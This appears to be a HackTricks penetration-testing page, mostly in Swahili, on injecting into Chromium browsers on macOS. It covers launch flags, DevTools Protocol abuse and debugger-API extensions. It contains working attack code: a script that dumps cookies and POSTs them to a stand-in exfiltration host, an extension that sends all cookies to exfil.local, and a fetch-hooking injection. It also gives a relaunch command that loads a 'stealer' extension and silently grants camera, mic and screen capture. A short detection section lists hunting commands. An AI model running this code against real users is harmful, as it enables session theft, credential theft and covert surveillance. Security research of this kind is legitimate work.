# Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Maelezo ya Msingi

Vivinjari vinavyotumia Chromium kama Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi, na Opera hutumia command-line switches, preference files, na DevTools automation interfaces zilezile. Kwenye macOS, mtumiaji yeyote mwenye ufikiaji wa GUI anaweza kusitisha browser session iliyopo na kuifungua tena kwa flags, extensions, au DevTools endpoints holela zinazotumia entitlements za lengwa.

#### Kuwasha Chromium kwa flags maalum kwenye macOS

macOS huhifadhi UI instance moja kwa kila Chromium profile, hivyo instrumentation kwa kawaida huhitaji kulazimisha browser ifungwe (kwa mfano kwa `osascript -e 'tell application "Google Chrome" to quit'`). Attackers kwa kawaida huwasha tena kupitia `open -na "Google Chrome" --args <flags>` ili waingize arguments bila kubadilisha app bundle. Kufunga command hiyo ndani ya user LaunchAgent (`~/Library/LaunchAgents/*.plist`) au login hook huhakikisha browser iliyochezewa inawashwa tena baada ya reboot/logoff.

#### `--load-extension` Flag

`--load-extension` flag hupakia kiotomatiki extensions ambazo hazijapakiwa (comma-separated paths). Iunganishe na `--disable-extensions-except` ili kuzuia extensions halali huku ukilazimisha payload yako pekee iendeshe. Extensions hasidi zinaweza kuomba permissions zenye athari kubwa kama `debugger`, `webRequest`, na `cookies` ili kuingia kwenye DevTools protocols, kurekebisha CSP headers, kushusha HTTPS, au ku-exfiltrate session material mara tu browser inapoanza.<sup>[[4]](#references)</sup>

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Switches hizi hufichua Chrome DevTools Protocol (CDP) kupitia TCP au pipe ili external tooling iweze kuendesha browser. Google ilibaini matumizi makubwa ya interface hii na infostealers na, kuanzia Chrome 136 (Machi 2025), switches hizi hupuuza default profile isipokuwa browser iwashwe na `--user-data-dir` isiyo ya kawaida. Hii hulazimisha App-Bound Encryption kwenye profiles halisi, lakini attackers bado wanaweza kuunda profile mpya, kumshawishi victim authenticate ndani yake (phishing/triage assistance), na kuvuna cookies, tokens, device trust states, au WebAuthn registrations kupitia CDP.<sup>[[5]](#references)</sup>

#### `--user-data-dir` Flag

Flag hii huelekeza browser profile nzima (History, Cookies, Login Data, Preference files, n.k.) kwenye path inayodhibitiwa na attacker. Ni lazima unapoichanganya na `--remote-debugging-port` kwenye modern Chrome builds, na pia huweka tampered profile ikiwa imetengwa ili uweze kuweka files za `Preferences` au `Secure Preferences` zilizojazwa mapema ambazo huzima security prompts, hu-install extensions kiotomatiki, na hubadilisha default schemes.

#### `--use-fake-ui-for-media-stream` Flag

Switch hii hupita camera/mic permission prompt, hivyo ukurasa wowote unaoita `getUserMedia` hupata access mara moja. Iunganishe na flags kama `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`, au CDP `Browser.grantPermissions` commands ili kunasa audio/video, kushiriki desktop, au kutimiza WebRTC permission checks kimya kimya bila user interaction.<sup>[[4]](#references)</sup>

## Delivery & Relaunch Patterns Seen in the Wild

CDP abuse kwa kawaida ni hatua ya **post-exploitation** badala ya payload ya awali. Kampeni ya hivi karibuni ya macOS iliyolenga developers ilitumia **`Run Script` build phase** yenye sumu (`PBXShellScriptBuildPhase`) ili code itekelezwe tu wakati victim **alijenga** project, si wakati alipo-clone au kuifungua tu. Baada ya execution hiyo ya kwanza, malware pia ili-infect miti mingine ya `.xcodeproj`, ikaongeza Git `pre-commit` hooks hasidi, na kutafuta Xcode projects zaidi ndani ya ZIP archives.<sup>[[3]](#references)</sup>

Kwa matumizi mabaya ya Chromium, hili ni muhimu kwa sababu attacker hahitaji ku-patch browser binary yenyewe. Build-phase / `osascript` stager ya muda mfupi inaweza badala yake kusakinisha **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher, n.k.) ambayo hufungua tena browser halali kwa flags zinazodhibitiwa na attacker kila mara user anapoianzisha.<sup>[[3]](#references)</sup>

> [!TIP]
> Kwenye developer endpoints, kagua files za `.pbxproj`, `.git/hooks/pre-commit`, na ZIPs zilizo na `.xcodeproj` kwa `curl`, `osascript`, `xxd`, `base64` iliyowekwa ndani kwa tabaka nyingi, au logic isiyotarajiwa ya kuanzisha tena Chrome.

## Remote Debugging & DevTools Protocol Abuse

Mara Chrome inapowashwa tena kwa `--user-data-dir` maalum na `--remote-debugging-port`, unaweza kujiunga kupitia CDP (kwa mfano kupitia `chrome-remote-interface`, `puppeteer`, au `playwright`) na ku-script workflows zenye privileges kubwa:

- **Cookie/session theft:** `Network.getAllCookies` na `Storage.getCookies` hurudisha HttpOnly values hata wakati App-Bound encryption kwa kawaida ingezuia filesystem access, kwa sababu CDP huiomba browser inayoendelea i-decrypt.
- **Permission tampering:** `Browser.grantPermissions` na `Emulation.setGeolocationOverride` hukuruhusu kupita camera/mic prompts (hasa zikichanganywa na `--use-fake-ui-for-media-stream`) au kughushi location-based security checks.
- **Keystroke/script injection:** `Runtime.evaluate` huendesha JavaScript holela ndani ya active tab, ikiwezesha credential lifting, DOM patching, au ku-inject persistence beacons zinazodumu baada ya navigation.<sup>[[1]](#references)</sup>
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` na `Fetch.enable` hukatiza authenticated requests/responses kwa wakati halisi bila kugusa disk artifacts.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Kwa sababu Chrome 136 huzuia CDP kwenye profile ya default, kunakili directory ya mtumiaji `~/Library/Application Support/Google/Chrome` iliyopo hadi kwenye staging path hakutoi tena cookies zilizodecryptiwa. Badala yake, social-engineer mtumiaji ili athibitishe utambulisho wake ndani ya profile iliyo instrumentiwa (kwa mfano, session ya support ya "msaada") au capture MFA tokens zikiwa in transit kupitia CDP-controlled network hooks.<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

Mfumo wa vitendo wa malware ni:

1. Anzisha upya userland implant au wrapper kila Chrome inapozinduliwa.
2. Zindua browser halali kwa `--remote-debugging-port=<port>` na, kwenye Chrome 136+, kwa kawaida pia tumia `--user-data-dir=<dir>` isiyo ya default.
3. Anzisha helper inayounganisha kwenye CDP WebSocket ya ndani na kusajili pre-document hook kwa `Page.addScriptToEvaluateOnNewDocument`.<sup>[[2]](#references)</sup>

Helper huyo anaweza kuingiza JavaScript **kabla** ya code ya site kuendeshwa, jambo linalofaa kwa ku-hook `window.fetch`, `XMLHttpRequest`, wallet providers, au autofill flows bila kupatch files zilizo kwenye disk.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Toleo lenye nguvu zaidi hugeuza browser kuwa **host command bridge**: JavaScript iliyodungwa hutoa `console.log` yenye alama ya kutenganisha, helper wa ndani hufuatilia `Runtime.consoleAPICalled`, huondoa alama hiyo, hutekeleza sehemu iliyobaki kupitia host shell (kwa mfano Go's `exec.Command`), na kurudisha stdout/stderr kupitia WebSocket ya mshambuliaji. Hii huboresha utekelezaji wa script katika kiwango cha tab kuwa reverse shell isiyotegemea faili kwa kiasi kikubwa.<sup>[[3]](#references)</sup>

## Extension-Based Injection kupitia Debugger API

Utafiti wa 2023 wa "Chrowned by an Extension" ulionyesha kwamba extension hasidi inayotumia API ya `chrome.debugger` inaweza kuunganishwa na tab yoyote na kupata uwezo uleule wa DevTools kama `--remote-debugging-port`.<sup>[[6]](#references)</sup> Hilo linavunja dhana za awali za isolation (extensions hubaki katika context yao) na kuwezesha:

- Wizi wa cookies na credentials kwa siri ukitumia `Network.getAllCookies`/`Fetch.getResponseBody`.
- Marekebisho ya site permissions (camera, microphone, geolocation) na bypass ya security interstitial, hivyo kuruhusu phishing pages kuiga Chrome dialogs.
- On-path tampering ya TLS warnings, downloads, au WebAuthn prompts kwa kuendesha `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior`, au `Security.handleCertificateError` kwa programmatic.

Load extension kwa kutumia `--load-extension`/`--disable-extensions-except` ili hakuna user interaction inayohitajika. Background script ndogo inayotumia API hii vibaya inaonekana hivi:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Extension inaweza pia kujisubscribe kwenye matukio ya `Debugger.paused` ili kusoma variables za JavaScript, kurekebisha inline scripts, au kuweka custom breakpoints zinazoendelea hata baada ya navigation. Kwa kuwa kila kitu huendeshwa ndani ya kikao cha GUI cha mtumiaji, Gatekeeper na TCC hazichochewi, jambo linalofanya technique hii iwe bora kwa malware ambayo tayari imepata execution chini ya user context.<sup>[[6]](#references)</sup>

## Utambuzi na Utafutaji

- Toa tahadhari Chromium browsers zinapozinduliwa kwa `--remote-debugging-port`, `--remote-debugging-pipe`, au `--user-data-dir` yenye mashaka, hasa parent ikiwa ni `bash`, `sh`, `osascript`, `xcodebuild`, au LaunchAgent helper.
- Tafuta chains fupi ambapo helper hufungua local CDP WebSocket, husajili `Page.addScriptToEvaluateOnNewDocument`, kisha huanzisha outbound WebSocket/HTTPS connection ya muda mrefu.
- Tafuta madaraja ya console-to-shell kwa kuoanisha shughuli za browser `Runtime.consoleAPICalled` na child shells au helper processes zinazotekeleza commands zinazotolewa na attacker.
- Kwenye developer Macs, kagua entries za `PBXShellScriptBuildPhase` ndani ya `.pbxproj`, Git `pre-commit` hooks, Dock/login item relaunchers, na Xcode projects zilizo ndani ya ZIP kwa ajili ya usakinishaji wa browser wrapper.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Zana

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Huendesha Chromium kiotomatiki kwa kutumia payload extensions na kutoa hooks za maingiliano za CDP.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Tooling inayofanana, inayolenga traffic interception na browser instrumentation kwa operators wa macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Library ya Node.js ya kuscript dumps za Chrome DevTools Protocol (cookies, DOM, permissions) mara tu instance ya `--remote-debugging-port` inapokuwa live.

### Mfano
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Pata mifano zaidi kwenye viungo vya tools.

## Marejeleo

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: Uchambuzi wa Kina wa Toleo la Hivi Karibuni la XCSSET - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) kwenye X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Mabadiliko kwenye remote debugging switches ili kuboresha usalama - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Kutumia vibaya Chrome DevTools Protocol kupitia Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
